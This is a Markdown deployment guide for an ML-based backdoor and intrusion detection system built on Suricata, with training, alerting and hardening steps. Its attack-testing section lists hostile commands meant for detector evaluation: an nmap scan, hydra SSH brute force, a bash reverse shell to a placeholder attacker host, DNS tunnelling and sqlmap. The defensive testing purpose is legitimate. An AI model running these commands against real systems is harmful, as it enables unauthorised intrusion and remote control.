# Production Deployment Guide

This guide walks you through deploying a **complete production-ready backdoor detection system** with real attack detection, model training, accuracy testing, and real-time alerting.

---

## 📋 Table of Contents

1. [Prerequisites](#prerequisites)
2. [Phase 1: Data Collection & Model Training](#phase-1-data-collection--model-training)
3. [Phase 2: System Deployment](#phase-2-system-deployment)
4. [Phase 3: Attack Simulation & Accuracy Testing](#phase-3-attack-simulation--accuracy-testing)
5. [Phase 4: Real-Time Alerting](#phase-4-real-time-alerting)
6. [Phase 5: Production Hardening](#phase-5-production-hardening)
7. [Monitoring & Maintenance](#monitoring--maintenance)

---

## Prerequisites

### Hardware Requirements
- **CPU**: 4+ cores recommended
- **RAM**: 8GB minimum, 16GB recommended
- **Storage**: 50GB+ for logs and models
- **Network**: Dedicated monitoring interface (optional but recommended)

### Software Requirements
```bash
# Operating System
Ubuntu 20.04+ / Debian 11+

# Core Dependencies
sudo apt update
sudo apt install -y \
    python3.8+ python3-pip python3-venv \
    suricata \
    tcpdump \
    git \
    build-essential

# Optional: Network tools for testing
sudo apt install -y \
    nmap \
    hping3 \
    netcat \
    metasploit-framework
```

### Python Environment
```bash
# Create virtual environment
cd /home/ubuntu/Desktop/Backdoor-Detection
python3 -m venv .venv
source .venv/bin/activate

# Install all dependencies
pip install --upgrade pip
pip install -r requirements.txt
```

---

## Phase 1: Data Collection & Model Training

### Step 1.1: Collect Network Traffic Dataset

You need a labeled dataset with both **benign** and **malicious** traffic. Here are your options:

#### Option A: Use Public Datasets (Recommended for Quick Start)

**Popular Datasets:**
1. **CICIDS2017/2018** - Comprehensive intrusion detection dataset
2. **NSL-KDD** - Classic network intrusion dataset
3. **UNSW-NB15** - Modern network traffic dataset
4. **CTU-13** - Botnet traffic dataset

**Download Example (CICIDS2017):**
```bash
# Create data directory
mkdir -p data/raw

# Download dataset (example - adjust URL)
cd data/raw
wget https://www.unb.ca/cic/datasets/ids-2017.html
# Follow dataset-specific instructions to extract
```

#### Option B: Generate Your Own Dataset (Recommended for Custom Needs)

We'll create a script to capture real traffic and label it:

```bash
# Run the data collection script (created in next step)
sudo python3 scripts/collect_network_data.py --duration 3600 --interface eth0
```

### Step 1.2: Train the ANN Model

Once you have a dataset, train your neural network:

```bash
# Train the network anomaly detection model
python3 backend_scripts/train_network_model.py \
    --dataset data/processed/network_traffic.csv \
    --output models/ \
    --epochs 50 \
    --batch-size 128
```

**Expected Output:**
- `models/backdoor_ann_model.h5` - Trained Keras model
- `models/scaler.pkl` - Feature scaler
- `models/encoders.pkl` - Label encoders
- `models/training_report.json` - Accuracy metrics

### Step 1.3: Train Host-Based Model

Train the Isolation Forest for host anomaly detection:

```bash
# Collect baseline host behavior (run during normal operations)
cd backend_scripts
python3 train_host_model.py

# This creates:
# - host_iso_forest.pkl
# - host_scaler.pkl
```

**Important:** Run this during **normal system operation** (no attacks) to establish a clean baseline.

### Step 1.4: Validate Model Performance

```bash
# Test the trained models
python3 backend_scripts/test_integration.py

# Expected output:
# ✓ Model loaded successfully
# ✓ Scaler loaded successfully
# ✓ Test accuracy: 95%+
```

---

## Phase 2: System Deployment

### Step 2.1: Configure Suricata

```bash
# Edit Suricata configuration
sudo nano /etc/suricata/suricata.yaml
```

**Key Settings:**
```yaml
# Set your network interface
af-packet:
  - interface: eth0  # Change to your interface
    
# Enable EVE JSON logging
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: /var/log/suricata/eve.json
      types:
        - alert
        - flow
        - dns
        - tls
```

**Update Suricata Rules:**
```bash
# Update rule sets
sudo suricata-update

# Restart Suricata
sudo systemctl restart suricata
sudo systemctl enable suricata

# Verify it's running
sudo systemctl status suricata
sudo tail -f /var/log/suricata/eve.json
```

### Step 2.2: Configure Application

```bash
# Copy environment template
cp .env.example .env

# Edit configuration
nano .env
```

**Critical Settings:**
```bash
# Network Interface
NETWORK_INTERFACE=eth0  # Your monitoring interface

# Suricata Log Path
SURICATA_EVE_LOG=/var/log/suricata/eve.json

# Model Directory
MODEL_DIR=/home/ubuntu/Desktop/Backdoor-Detection/models

# Log Directory
LOG_DIR=/var/log/backdoor-detection

# Alert Settings (for Phase 4)
ENABLE_EMAIL_ALERTS=true
ALERT_EMAIL=security@yourcompany.com
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
```

### Step 2.3: Create Log Directory

```bash
# Create log directory with proper permissions
sudo mkdir -p /var/log/backdoor-detection
sudo chown $USER:$USER /var/log/backdoor-detection
```

### Step 2.4: Start Production System

```bash
# Start the application
sudo python3 app.py

# Or use systemd for production (see Phase 5)
```

**Access Dashboard:**
- URL: `http://localhost:7000`
- Click **Start Monitoring**
- Verify all three engines are running

---

## Phase 3: Attack Simulation & Accuracy Testing

### Step 3.1: Setup Attack Testing Environment

**Safety First:**
- ⚠️ **NEVER** run attacks on production networks without authorization
- Use isolated test environment or virtual network
- Get proper authorization before testing

### Step 3.2: Automated Attack Simulation

We'll create a comprehensive attack testing suite:

```bash
# Run the attack simulation suite
sudo python3 scripts/attack_simulator.py --mode test --duration 600
```

**Attack Types to Test:**

1. **Port Scanning**
   ```bash
   nmap -sS -p- target_ip
   ```

2. **SSH Brute Force**
   ```bash
   hydra -l admin -P wordlist.txt ssh://target_ip
   ```

3. **Reverse Shell**
   ```bash
   nc -lvp 4444  # Attacker listener
   bash -i >& /dev/tcp/attacker_ip/4444 0>&1  # Victim
   ```

4. **DNS Tunneling**
   ```bash
   dnscat2-server
   ```

5. **SQL Injection** (if web app present)
   ```bash
   sqlmap -u "http://target/page?id=1" --batch
   ```

### Step 3.3: Measure Detection Accuracy

```bash
# Run accuracy testing
python3 scripts/measure_accuracy.py \
    --attack-log attacks_performed.json \
    --detection-log /var/log/backdoor-detection/hybrid_live.log \
    --output accuracy_report.json
```

**Expected Metrics:**
- **True Positive Rate (TPR)**: 90%+ (attacks detected)
- **False Positive Rate (FPR)**: <5% (benign traffic misclassified)
- **Precision**: 85%+
- **F1-Score**: 88%+

### Step 3.4: Confusion Matrix Analysis

The accuracy script will generate:
```
Confusion Matrix:
                Predicted Benign    Predicted Malicious
Actual Benign        9500 (TN)           50 (FP)
Actual Malicious      100 (FN)          350 (TP)

Metrics:
- Accuracy: 98.5%
- Precision: 87.5%
- Recall: 77.8%
- F1-Score: 82.4%
```

---

## Phase 4: Real-Time Alerting

### Step 4.1: Email Alerts

Configure SMTP settings in `.env`:
```bash
ENABLE_EMAIL_ALERTS=true
ALERT_EMAIL=security@company.com
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
SMTP_USERNAME=alerts@company.com
SMTP_PASSWORD=your_app_password
```

### Step 4.2: Slack Integration

```bash
# Add to .env
ENABLE_SLACK_ALERTS=true
SLACK_WEBHOOK_URL=https://hooks.slack.com/services/YOUR/WEBHOOK/URL
```

### Step 4.3: SMS Alerts (Twilio)

```bash
# Add to .env
ENABLE_SMS_ALERTS=true
TWILIO_ACCOUNT_SID=your_sid
TWILIO_AUTH_TOKEN=your_token
TWILIO_FROM_NUMBER=+1234567890
TWILIO_TO_NUMBER=+1987654321
```

### Step 4.4: Custom Webhook

```bash
# Add to .env
ENABLE_WEBHOOK_ALERTS=true
WEBHOOK_URL=https://your-siem.com/api/alerts
WEBHOOK_AUTH_TOKEN=your_token
```

### Step 4.5: Alert Thresholds

Configure in `config.py`:
```python
# Alert only on high-confidence detections
ALERT_THRESHOLD = 0.75  # 75% confidence minimum

# Alert rate limiting (prevent spam)
ALERT_COOLDOWN_SECONDS = 300  # 5 minutes between similar alerts

# Alert severity levels
SEVERITY_CRITICAL = 0.9  # Immediate notification
SEVERITY_HIGH = 0.75     # Email/Slack
SEVERITY_MEDIUM = 0.6    # Log only
```

---

## Phase 5: Production Hardening

### Step 5.1: Create Systemd Service

```bash
# Create service file
sudo nano /etc/systemd/system/backdoor-detection.service
```

**Service Configuration:**
```ini
[Unit]
Description=Backdoor Detection System
After=network.target suricata.service

[Service]
Type=simple
User=root
WorkingDirectory=/home/ubuntu/Desktop/Backdoor-Detection
Environment="PATH=/home/ubuntu/Desktop/Backdoor-Detection/.venv/bin"
ExecStart=/home/ubuntu/Desktop/Backdoor-Detection/.venv/bin/python3 app.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**Enable Service:**
```bash
sudo systemctl daemon-reload
sudo systemctl enable backdoor-detection
sudo systemctl start backdoor-detection
sudo systemctl status backdoor-detection
```

### Step 5.2: Log Rotation

```bash
# Create logrotate configuration
sudo nano /etc/logrotate.d/backdoor-detection
```

**Configuration:**
```
/var/log/backdoor-detection/*.log {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
    create 0640 root root
    sharedscripts
    postrotate
        systemctl reload backdoor-detection > /dev/null 2>&1 || true
    endscript
}
```

### Step 5.3: Security Hardening

```bash
# Restrict file permissions
chmod 600 .env
chmod 700 models/
chmod 755 backend_scripts/*.py

# Create dedicated user (optional)
sudo useradd -r -s /bin/false backdoor-detection
sudo chown -R backdoor-detection:backdoor-detection /home/ubuntu/Desktop/Backdoor-Detection
```

### Step 5.4: Firewall Configuration

```bash
# Allow dashboard access (adjust as needed)
sudo ufw allow 7000/tcp

# Restrict to specific IPs
sudo ufw allow from 192.168.1.0/24 to any port 7000
```

### Step 5.5: SSL/TLS for Dashboard

```bash
# Install nginx as reverse proxy
sudo apt install nginx certbot python3-certbot-nginx

# Configure nginx
sudo nano /etc/nginx/sites-available/backdoor-detection
```

**Nginx Configuration:**
```nginx
server {
    listen 80;
    server_name your-domain.com;
    
    location / {
        proxy_pass http://127.0.0.1:7000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

```bash
# Enable site and get SSL certificate
sudo ln -s /etc/nginx/sites-available/backdoor-detection /etc/nginx/sites-enabled/
sudo certbot --nginx -d your-domain.com
sudo systemctl restart nginx
```

---

## Monitoring & Maintenance

### Daily Checks

```bash
# Check system status
sudo systemctl status backdoor-detection suricata

# Check recent alerts
tail -n 100 /var/log/backdoor-detection/hybrid_live.log | grep MALICIOUS

# Check disk space
df -h /var/log
```

### Weekly Maintenance

```bash
# Review false positives
python3 scripts/analyze_false_positives.py --last-week

# Update Suricata rules
sudo suricata-update
sudo systemctl restart suricata

# Backup models
tar -czf models_backup_$(date +%Y%m%d).tar.gz models/
```

### Monthly Tasks

```bash
# Retrain models with new data
python3 backend_scripts/train_network_model.py --incremental

# Review and tune alert thresholds
python3 scripts/optimize_thresholds.py

# Security audit
python3 scripts/security_audit.py
```

### Performance Monitoring

```bash
# Monitor resource usage
htop
iotop

# Check detection latency
python3 scripts/measure_latency.py

# Database cleanup (if using one)
python3 scripts/cleanup_old_logs.py --days 90
```

---

## Troubleshooting

### High False Positive Rate

1. **Retrain with more benign data**
   ```bash
   python3 backend_scripts/train_network_model.py --benign-ratio 0.8
   ```

2. **Adjust detection threshold**
   ```python
   # In config.py
   DETECTION_THRESHOLD = 0.7  # Increase from 0.5
   ```

3. **Review feature engineering**
   ```bash
   python3 scripts/analyze_features.py
   ```

### Missed Attacks (Low Recall)

1. **Collect more attack samples**
2. **Retrain with balanced dataset**
3. **Lower detection threshold** (carefully)
4. **Add more features** to the model

### Performance Issues

1. **Optimize model inference**
   ```bash
   # Convert to TensorFlow Lite
   python3 scripts/convert_to_tflite.py
   ```

2. **Batch processing**
   ```python
   # Process events in batches instead of one-by-one
   BATCH_SIZE = 32
   ```

3. **Use GPU acceleration**
   ```bash
   pip install tensorflow-gpu
   ```

---

## Next Steps

1. ✅ Complete Phase 1: Train your models
2. ✅ Complete Phase 2: Deploy the system
3. ✅ Complete Phase 3: Test accuracy with simulated attacks
4. ✅ Complete Phase 4: Configure alerting
5. ✅ Complete Phase 5: Harden for production
6. 📊 Monitor and iterate based on real-world performance

---

## Additional Resources

- **Suricata Documentation**: https://suricata.readthedocs.io/
- **TensorFlow Guide**: https://www.tensorflow.org/guide
- **CICIDS Dataset**: https://www.unb.ca/cic/datasets/
- **MITRE ATT&CK Framework**: https://attack.mitre.org/

---

## Support

For issues or questions:
1. Check the [TROUBLESHOOTING.md](TROUBLESHOOTING.md) guide
2. Review logs in `/var/log/backdoor-detection/`
3. Open an issue on GitHub
4. Contact the security team

---

**⚠️ Security Notice**: This system is a detection tool, not a prevention tool. Always use it as part of a comprehensive security strategy with firewalls, IDS/IPS, and proper network segmentation.
